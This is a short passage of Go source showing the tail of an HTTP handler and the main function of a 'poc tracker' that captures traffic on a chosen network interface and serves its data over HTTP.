	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Write(data)
}

var iface = flag.String("iface", "", "interface to capture on")

func main() {
	flag.Parse()
	if *iface == "" {
		flag.Usage()
		return
	}
	log.Printf("poc tracker v%d.%d start (capturing on: %s)\n", TRACKER_VERSION_MAJOR, TRACKER_VERSION_MINOR, *iface)
	t := NewTracker(*iface)
	log.Fatal(t.ListenAndServe())
}
